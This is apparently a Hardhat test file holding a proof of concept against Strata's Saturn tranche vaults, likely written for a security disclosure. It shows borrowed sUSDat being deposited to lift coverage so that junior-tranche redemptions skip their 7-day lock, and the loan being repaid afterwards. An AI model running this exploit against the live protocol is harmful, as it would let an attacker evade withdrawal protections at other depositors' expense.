import { HardhatProvider } from 'dequanto/hardhat/HardhatProvider';
import { UTest } from 'atma-utest';
import { $require } from 'dequanto/utils/$require';
import { $bigint } from 'dequanto/utils/$bigint';
import { $hh } from '../utils/$hh';
import { $erc20 } from '../utils/$erc20';
import { $erc4626 } from '../utils/$erc4626';

/**
 * Transient JRT coverage bypass — Saturn-native classification PoC.
 *
 * Uses Strata's real Saturn deployment stack and production configuration:
 *   coverage <= 15%: 21-day JRT lock, 0 bps
 *   15% < coverage <= 30%: 7-day JRT lock, 10 bps
 *   coverage > 30%: immediate, 20 bps
 *   hard minimum JRT/SRT ratio: 7.5%
 *
 * A lender owns sUSDat before the snapshot. The attacker temporarily borrows
 * those existing strategy-token units, deposits them as JRT, uses the resulting
 * coverage to move two independent redemptions into the zero-lock tier, then
 * repays the exact sUSDat units. No flash-minted protocol asset is required.
 */

const hh = new HardhatProvider();
const attacker = await hh.deployer(1);
const liquidityProvider = await hh.deployer(2);
const lender = await hh.deployer(3);
const test = await $hh.create('saturn');

const {
    jrtVault,
    srtVault,
    cdo,
} = await test.deploy({ initialDeposit: false });
const { base, sUSDat } = await test.factory.ensureUnderlying();
const { sharesCooldown } = await test.factory.ensureCooldowns(cdo);
const { deployer } = test;

// Ordinary LP seeds both tranches. Attacker later acquires pre-existing JRT.
await $erc20.mint(base, deployer, liquidityProvider, 1_230);
await $erc4626.depositMeta(jrtVault, base.address, liquidityProvider, 230);
await $erc4626.depositMeta(srtVault, base.address, liquidityProvider, 1_000);
await $erc20.transfer(jrtVault, liquidityProvider, attacker.address, 25);

// Lender acquires the temporary strategy-token capital before the attack.
// 105 USDat-equivalent is enough to lift ~23% coverage above 30% and keep it
// above 30% after the old 25-JRT position exits.
const LOAN_VALUE = 105n * 10n ** 6n;
const loanShares = await sUSDat.convertToShares(LOAN_VALUE);
await $erc4626.mint(sUSDat as any, lender, loanShares);
$require.eq(await sUSDat.balanceOf(lender.address), loanShares);

const initialCoverage = Number(await cdo.coverage());
$require.gt(initialCoverage, 150_000);
$require.lt(initialCoverage, 300_000);

await test.snapshot('transient-coverage-bypass-saturn');

UTest.create({
    async $after () {
        await test.wipe();
    },
    async $teardown () {
        await test.reset('transient-coverage-bypass-saturn');
    },

    async 'control: Saturn protected-tier JRT is placed in SharesCooldown' () {
        const oldShares = await jrtVault.balanceOf(attacker.address);
        const cooldownBefore = await jrtVault.balanceOf(sharesCooldown.address);
        const attackerSUSDatBefore = await sUSDat.balanceOf(attacker.address);

        const immediateOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            oldShares,
        );

        $require.eq(immediateOut, 0n);
        $require.eq(await sUSDat.balanceOf(attacker.address), attackerSUSDatBefore);
        $require.eq(await jrtVault.balanceOf(attacker.address), 0n);
        $require.gt(await jrtVault.balanceOf(sharesCooldown.address), cooldownBefore);
    },

    async 'attack: temporary sUSDat-funded JRT unlocks both exits and is repaid' () {
        const coverageBefore = Number(await cdo.coverage());
        $require.gt(coverageBefore, 150_000);
        $require.lt(coverageBefore, 300_000);

        const oldShares = await jrtVault.balanceOf(attacker.address);
        const cooldownBefore = await jrtVault.balanceOf(sharesCooldown.address);

        // Temporary existing sUSDat, modeled as a lender-funded loan.
        await $erc20.transfer(sUSDat, lender, attacker.address, loanShares);
        await $erc4626.depositMeta(jrtVault, sUSDat.address, attacker, loanShares);

        $require.gt(Number(await cdo.coverage()), 300_000);

        // First independent redemption: pre-existing JRT exits synchronously to
        // sUSDat because Saturn's JRT sUSDat strategy cooldown is configured to 0.
        const oldAssetsOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            oldShares,
        );
        $require.gt(oldAssetsOut, 0n);

        // The temporary JRT still holds coverage above the zero-lock threshold.
        $require.gt(Number(await cdo.coverage()), 300_000);

        // Second independent redemption: unwind the temporary JRT itself.
        const temporaryShares = await jrtVault.balanceOf(attacker.address);
        $require.gt(temporaryShares, 0n);
        const temporaryAssetsOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            temporaryShares,
        );
        $require.gt(temporaryAssetsOut, 0n);

        // Neither redemption served Saturn's 7-day share lock.
        $require.eq(await jrtVault.balanceOf(attacker.address), 0n);
        $require.eq(await jrtVault.balanceOf(sharesCooldown.address), cooldownBefore);

        // Coverage immediately falls back into the same protected 15-30% band.
        const coverageAfter = Number(await cdo.coverage());
        $require.gt(coverageAfter, 150_000);
        $require.lt(coverageAfter, 300_000);

        // Repay exactly the strategy-token units that were borrowed.
        $require.gte(await sUSDat.balanceOf(attacker.address), loanShares);
        await $erc20.transfer(sUSDat, attacker, lender.address, loanShares);
        $require.eq(await sUSDat.balanceOf(lender.address), loanShares);

        // Old JRT value remains with the attacker after repaying temporary capital.
        const attackerResidual = await sUSDat.balanceOf(attacker.address);
        $require.gt(attackerResidual, 20n * 10n ** 18n);
        $require.lt(attackerResidual, 30n * 10n ** 18n);
    },
});
